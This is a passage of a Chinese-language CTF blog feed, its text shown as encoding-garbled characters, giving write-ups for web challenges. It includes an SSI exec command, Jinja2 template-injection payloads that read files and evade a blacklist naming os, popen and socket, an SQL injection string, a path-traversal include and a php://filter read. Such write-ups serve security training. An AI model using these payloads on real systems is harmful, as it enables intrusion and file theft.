class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == substr(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = fopen(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            fwrite(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            fclose(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ„æ€è®©å’±ä»¬å†™ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000000</span>):<br>    a = hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">if</span> a[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182255896.png" alt="image-20220118225546700"></p><p>å°†ä¸Šé¢çš„è„šæœ¬è·‘ä¸€ä¸‹ï¼Œæ‹¿é‡Œé¢çš„ç»“æœä¼ å‚ å‘ç°ä¸€ä¸ªæ–°çš„åœ°å€</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182256619.png" alt="image-20220118225650443"></p><p>ç»§ç»­ç›´æ¥ä¼ å‚æˆ‘æ˜¯ç›´æ¥å¤åˆ¶çš„åœ°å€ ç„¶è€Œ helloåé¢è‡ªåŠ¨è·Ÿäº† 2020666 è¿™æ˜¯å¦æ„å‘³ç€è¿™é‡Œå­˜åœ¨ æ¨¡æ¿+æ¸²æŸ“çš„é€»è¾‘ï¼Ÿ</p><p>ç„¶åæˆ‘å°è¯•äº†sstiæ²¡æˆâ€¦ç»§ç»­çœ‹wpï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªapacheçš„æ´</p><p>åˆ©ç”¨æ–¹å¼</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;whoami&quot; --&gt;</span><br></code></pre></td></tr></table></figure><p>ç»§ç»­åœ¨usernameå“ªé‡Œä¼ å‚ ä¸è¿‡è¦é‡æ–°å›åˆ°index.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182300035.png" alt="image-20220118230050846"></p><p>ä¹‹åè®¿é—®å¯¹åº”çš„shtmlå³å¯å¾—åˆ°å¯¹åº”çš„ç»“æœ</p><p>ç„¶åå°±æ˜¯ä¸€æ­¥æ­¥å‘½ä»¤æ‰§è¡Œäº†è¿™é‡Œæ‰§è¡Œä¸äº†findå‘½ä»¤ /var/www/html/public è¿™æ˜¯ç½‘ç«™çš„å·¥ä½œç›®å½•</p><p>flagåœ¨ /var/www/html ä¸‹</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182306569.png" alt="image-20220118230615331"></p><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>å“‡ï¼Œä¸€æ¬¡åŠ å¯†ï¼Œä¸€æ¬¡è§£å¯†ï¼Œå¾ˆéš¾å—</p><p>ä½¿ç”¨è¿™æ®µä»£ç è¯»å–æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;app.py&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>hh å¼±æ™ºäº†ï¼Œä¸ºä»€ä¹ˆä¸èƒ½æŠŠå­—å…¸å…ˆbase64åŠ å¯†ä¸€éã€‚éè¦ç”¨å®ƒçš„åŠ å¯†æ¨¡å—ï¼Œæˆ‘æ˜¯å¼±æ™ºâ€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template_string<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template,request,flash,redirect,url_for<br><span class="hljs-keyword">from</span> flask_wtf <span class="hljs-keyword">import</span> FlaskForm<br><span class="hljs-keyword">from</span> wtforms <span class="hljs-keyword">import</span> StringField, SubmitField<br><span class="hljs-keyword">from</span> wtforms.validators <span class="hljs-keyword">import</span> DataRequired<br><span class="hljs-keyword">from</span> flask_bootstrap <span class="hljs-keyword">import</span> Bootstrap<br><span class="hljs-keyword">import</span> base64<br> <br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span><br>bootstrap = Bootstrap(app)<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NameForm</span>(<span class="hljs-params">FlaskForm</span>):</span><br>    text = StringField(<span class="hljs-string">&#x27;BASE64åŠ å¯†&#x27;</span>,validators= [DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;æäº¤&#x27;</span>)<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NameForm1</span>(<span class="hljs-params">FlaskForm</span>):</span><br>    text = StringField(<span class="hljs-string">&#x27;BASE64è§£å¯†&#x27;</span>,validators= [DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;æäº¤&#x27;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    black_list = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;os&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;import&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;chr&quot;</span>,<span class="hljs-string">&quot;request&quot;</span>,<br>                  <span class="hljs-string">&quot;subprocess&quot;</span>,<span class="hljs-string">&quot;commands&quot;</span>,<span class="hljs-string">&quot;socket&quot;</span>,<span class="hljs-string">&quot;hex&quot;</span>,<span class="hljs-string">&quot;base64&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list :<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower() :<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br> <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hint&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hint</span>():</span><br>    txt = <span class="hljs-string">&quot;å¤±è´¥ä¹ƒæˆåŠŸä¹‹æ¯ï¼ï¼&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;hint.html&quot;</span>,txt = txt)<br> <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>():</span><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) :<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64encode(text.encode())<br>        tmp = <span class="hljs-string">&quot;ç»“æœ  :&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(text_decode.decode()))<br>        res =  render_template_string(tmp)<br>        flash(tmp)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;encode&#x27;</span>))<br> <br>    <span class="hljs-keyword">else</span> :<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,form = form ,method = <span class="hljs-string">&quot;åŠ å¯†&quot;</span> ,img = <span class="hljs-string">&quot;flask.png&quot;</span>)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/decode&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>():</span><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) :<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64decode(text.encode())<br>        tmp = <span class="hljs-string">&quot;ç»“æœ ï¼š &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br>        <span class="hljs-keyword">if</span> waf(tmp) :<br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>        res =  render_template_string(tmp)<br>        flash( res )<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br> <br>    <span class="hljs-keyword">else</span> :<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm1(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,form = form, method = <span class="hljs-string">&quot;è§£å¯†&quot;</span> , img = <span class="hljs-string">&quot;flask1.png&quot;</span>)<br> <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;name&gt;&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">not_found</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;404.html&quot;</span>,name = name)<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤çš„æ˜¯å•è¯æ‰€ä»¥å¾ˆæ˜æ˜¾æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‹¼æ¥çš„æ–¹å¼</p><p>ç„¶å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__imp&#x27;</span>+<span class="hljs-string">&#x27;ort__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-string">&#x27;/&#x27;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>å¾—åˆ° flag åœ¨ /this_is_the_flag.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/this_is_the_fl&#x27;</span>+<span class="hljs-string">&#x27;ag.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_web_ç¬¬ä¸€é¡µwpåˆ†äº«</title>
    <link href="/2022/01/12/BUUCTF-web-%E7%AC%AC%E4%B8%80%E9%A1%B5wp%E5%88%86%E4%BA%AB/"/>
    <url>/2022/01/12/BUUCTF-web-%E7%AC%AC%E4%B8%80%E9%A1%B5wp%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p>ä¸‡èƒ½å¯†ç ç›´æ¥å‡º</p><figure class="highlight ada"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>é‡ç‚¹ï¼šinclude å¯¹ â€˜/â€˜çš„å¤„ç†</p><p>æ ¹æ®æ³¨é‡Šæ‹¿åˆ°phpæºç ,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>) //å®‰å…¨å‡½æ•° æ£€æŸ¥æ˜¯å¦åœ¨ç™½åå•é‡Œ</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !is_string(<span class="hljs-variable">$page</span>)) &#123; <span class="hljs-comment">//pageå‚æ•°strç±»å‹</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = mb_substr(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br><span class="hljs-comment">//            demo:$page=&#x27;http://www.baidu.com/123/456/../../../../?source.php&amp;b=1&#x27;</span><br>            <span class="hljs-comment">//ç»“æœ&quot;http://www.baidu.com/123/456/../../../../&quot;</span><br>            <span class="hljs-comment">//å¯ä»¥çœ‹åˆ°å®é™…ä¸Šå®Œæˆäº†å»é™¤ä¼ å‚çš„å·¥ä½œ ä¸‹é¢åŒç†</span><br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>); <span class="hljs-comment">//ä¸€æ¬¡urlè§£ç </span><br>            <span class="hljs-variable">$_page</span> = mb_substr(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨hint.php</p><p>æç¤ºæˆ‘ä»¬ flagåœ¨ /ffffllllaaaagggg </p><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾å‘ç° å¦‚æœæƒ³è¦æ–‡ä»¶åŒ…å« å¿…é¡»è¦ä¸€æ¬¡urlè§£å¯† ä¸‰æ¬¡ç™½åå•éªŒè¯ ä¸¤æ¬¡å–è·¯å¾„ï¼ˆå°±æ˜¯ä¸ç®¡åé¢å‚æ•°ï¼‰</p><p>å“ï¼Ÿé‚£è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¤šæ‰“å‡ ä¸ªé—®å·èƒ½ä¸èƒ½ç»•è¿‡å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºstrposå–çš„æ˜¯é—®å·ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</p><p>æ‰€ä»¥å…¶å®å¤šå¤„ç†é‚£å‡ æ¬¡åŒºåˆ«ä¸å¤§ æˆ‘ä»¬è‚¯å®šæ˜¯å¸Œæœ›ä¼šåœ¨æœ€åè¿”å› true ç„¶å æ–‡ä»¶åŒ…å« $file</p><p>è¿™ç§æ—¶å€™å…¶å®å¯ä»¥è¯•è¯•è·¯å¾„ç©¿è¶Šï¼Œè¿”å›trueå³å¯</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201072224540.png" alt="image-20220107222434456"></p><p>æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=hint.php?<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥è¿‡è¿™ä¸ªåˆ¤æ–­</p><p>ç»“åˆè·¯å¾„ç©¿è¶Šï¼Œæ„é€ </p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=hint.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg <br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¿™æ ·å†™ï¼Ÿå¯¹äºinclude å¦‚æœåé¢çš„å†…å®¹å¸¦ â€˜/â€˜ ä¼šè¢«è¯†åˆ«ä¸ºç›®å½• é‚£ä¹ˆæœ€åä¼šåŒ…å«æœ€åçš„å†…å®¹ ../ä½œä¸ºç›®å½•ç©¿è¶Š</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h2><p>æŸ¥çœ‹æºç å¾—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cat</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cat</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$cat</span>==<span class="hljs-string">&#x27;dog&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>æ˜¾ç„¶flagä¸æ˜¯Syc{cat_cat_cat_cat} ä½†æ˜¯å‘Šè¯‰ä½ è·å–flagæ–¹å¼äº†</p><p>æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?cat=dog<br></code></pre></td></tr></table></figure><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p>å°±æ˜¯éª—äº†ä¸€ä¸‹å§</p><p>å…¶å®å°±æ˜¯å¤§æ¦‚è¿™æ ·çš„å†™æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;5a15074c-0bd0-473e-bf9d-516544448c9a&#125;</span><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf8&quot;</span>&gt;<br>Can you find out the flag?<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>å¸¸è§„ä¸‹phpä»£ç ä¸å¯è§†ï¼Œæ‰€ä»¥ç”¨ä¼ªåè®®è¯»å–å³å¯</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span><span class="hljs-keyword">read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" 